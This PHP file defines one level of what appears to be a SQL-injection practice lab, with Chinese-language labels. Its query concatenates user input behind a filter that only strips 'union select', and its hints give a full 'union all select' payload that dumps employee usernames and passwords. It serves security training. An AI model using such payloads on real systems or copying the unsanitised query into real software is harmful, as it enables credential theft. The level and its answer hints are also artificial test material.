<?php
// Less-28a 资产领用（简化）
if (!defined('SQLI_MALL')) { die('forbidden'); }
return [
  'title' => '资产领用（简化）',
  'desc'  => '查询资产领用记录（简版接口）。',
  'method' => 'GET',
  'form' => ['method' => 'GET', 'fields' => array (
  'id' => '资产编号',
), 'submit' => '查 询'],
  'difficulty' => 4,
  'task' => '只过滤了 union select 连写，用 union all select 绕过',
  'hints' => array (
  0 => '过滤名单比上一关少很多：只有 union\\s+select。',
  1 => 'union all select 可直接使用。',
  2 => '示例：?id=-1\') union all select 1,group_concat(username,0x3a,password),3 from oa_employee-- -',
),
  'run' => function ($app) {
    if (!isset($_GET['id'])) return $app->info('请输入资产编号。');
    $id = $_GET['id'];
    $id = preg_replace('/union\\s+select/i', '', $id);
    $sql = "SELECT id, title, content FROM oa_notice WHERE id=('{$id}') LIMIT 0,1";
    $res = $app->q($sql);
    $row = $app->fetch($res);
    if ($row) {
    return $app->card(['公文标题' => $row['title'], '正文内容' => $row['content']]);
    }
    return $app->info('');
  },
];
